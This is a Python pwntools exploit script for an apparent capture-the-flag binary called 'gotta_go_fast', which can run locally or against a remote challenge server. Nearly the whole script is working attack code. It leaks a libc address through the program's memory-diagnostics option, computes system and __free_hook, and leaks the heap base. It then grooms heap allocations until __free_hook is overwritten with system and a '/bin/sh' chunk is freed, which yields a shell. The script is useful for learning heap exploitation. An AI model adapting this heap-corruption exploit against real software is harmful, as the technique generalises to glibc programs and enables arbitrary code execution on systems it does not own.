from pwn import *
import os 
import sys


LIBCSEVER = './libc6_2.23-0ubuntu11.2_amd64.so'
LIBCLOCAL = '/lib/x86_64-linux-gnu/libc.so.6'
BINARY = './gotta_go_fast'
HOST = "chal.imaginaryctf.org"
PORT = 42009



if sys.argv[1] == "1":
    p = process(BINARY)
    elf = ELF(BINARY)
    libc = ELF(LIBCLOCAL)
elif sys.argv[1] == "2":
    p = remote(HOST,PORT)
    elf = ELF(BINARY)
    libc = ELF(LIBCSEVER)
else:
    p = process(BINARY)
    elf = ELF(BINARY)
    libc = ELF(LIBCLOCAL)


def Draft(district, index_in_district, data):
    p.sendlineafter("> ", str(0))
    p.sendlineafter("> ",str(district))
    p.sendlineafter("> ",str(index_in_district))
    p.sendlineafter("Least importantly, what's their name?\n",data)
def UnDraft(idx):
    p.sendlineafter("> ", str(1))
    p.sendlineafter("> ",str(idx))
def List():
    p.sendlineafter("> ", str(2))
def Diagnostics(address):
    p.sendlineafter("> ", str(4))
    p.sendlineafter("let me know which memory address you need...\n",str(address))
    
def main():
    head = 0x602050
    got_puts = 0x601fb0
    Diagnostics(got_puts)
    puts = int(p.recvuntil("\n")[:-1], 16)
    log.success("got_puts: " + hex(puts))
    libc_base = puts - libc.symbols['puts']
    log.success("libc_base: " + hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']
    one = libc_base + 0xf03a4 
    log.success("one_gadget: " + hex(one))
    #temp = p64(one)
    
    offset = 0x64
    payload = p64(0)
    payload += b'A'*4
    Draft(1,1, payload)
    Draft(1,1, payload)
    Draft(1,1, payload)

    UnDraft(0x68)
    List() # off = 0x430
    p.recvuntil("Tribute 0 [")
    leak = u64(p.recvuntil("]")[:-1].ljust(8, b'\x00'))
    heap_base = leak - 0x430 
    log.success("heap_base: " + hex(heap_base))
    
    
    
    temp = p64(system)
    Draft(1,1, temp)
    Draft(1,1, payload)
    UnDraft(0)
    UnDraft(0x64)
    for i in range(4):
        Draft(1,1, payload)

    Draft(1,1, payload)
    Draft(1,1, payload)
    
    payload1 = b'/bin/sh\x00'
    payload1 += p64(system)
    payload1 += p64(free_hook)
    payload1 += p64(100)
    
    Draft(1,1, payload1)# no day
    Draft(1,1, payload)

    for i in range(80 + 10):
        print(i)
        Draft(1,1, payload)
    Draft(1,1, b'a')
    UnDraft(8)
    
    
    
    
    
    p.interactive()
if __name__ == '__main__':
    main()
